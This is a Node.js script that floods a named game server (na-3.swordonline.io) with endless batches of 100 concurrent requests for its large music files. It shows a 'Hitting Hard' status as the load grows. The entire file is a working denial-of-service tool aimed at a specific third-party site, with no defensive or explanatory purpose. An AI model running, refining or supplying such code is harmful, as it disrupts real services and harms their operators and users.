const https = require("https");

const SERVER = "na-3"; // server prefix

// generate /client/sound/music1.mp3 .. /client/sound/music33.mp3
const PATHS = Array.from(
  { length: 33 },
  (_, i) => `/client/sound/music${i + 1}.mp3`,
);

const agent = new https.Agent({ keepAlive: true, maxSockets: 10 });

// rolling log of last 500 "would-be" sizes
const recentSizes = [];

function formatBytes(bytes) {
  if (!bytes || isNaN(bytes)) return 0;
  return bytes;
}

function formatHuman(bytes) {
  if (!bytes || isNaN(bytes)) return "unknown";
  const units = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return (bytes / Math.pow(1024, i)).toFixed(2) + " " + units[i];
}

async function hammerOnce(path) {
  const URL = `https://${SERVER}.swordonline.io` + path;
  try {
    const controller = new AbortController();
    const abortTimer = setTimeout(() => controller.abort(), 1000);

    const res = await fetch(URL, {
      method: "GET",
      agent,
      signal: controller.signal,
    });

    clearTimeout(abortTimer);

    const len = res.headers.get("content-length");
    const size = len ? formatBytes(Number(len)) : 0;

    // keep track of last 500
    recentSizes.push(size);
    if (recentSizes.length > 500) recentSizes.shift();

    const avg =
      recentSizes.reduce((a, b) => a + b, 0) / (recentSizes.length || 1);

    const status = avg > 1024 * 1024 ? "Hitting Hard..." : "Hitting Soft...";

    console.clear();
    console.log("SERVER: ", SERVER);
    console.log("Status:", status);
    console.log("Latest file:", path, "| Size:", formatHuman(size));
    console.log("Average (last 60):", formatHuman(avg));
  } catch (e) {
    // push 0 size for errors
    recentSizes.push(0);
    if (recentSizes.length > 500) recentSizes.shift();

    const avg =
      recentSizes.reduce((a, b) => a + b, 0) / (recentSizes.length || 1);

    // Force "hard" on error
    const status = "Hitting Hard...";

    console.clear();
    console.log("SERVER: ", SERVER);
    console.log("Status:", status);
    console.log("Err:", path, e.name || e.message);
    console.log("Average (last 500):", formatHuman(avg));
  }
}

async function hammerLoop() {
  while (true) {
    const batch = Array.from({ length: 100 }, () => {
      const path = PATHS[Math.floor(Math.random() * PATHS.length)];
      return hammerOnce(path);
    });
    await Promise.allSettled(batch);
  }
}

hammerLoop();
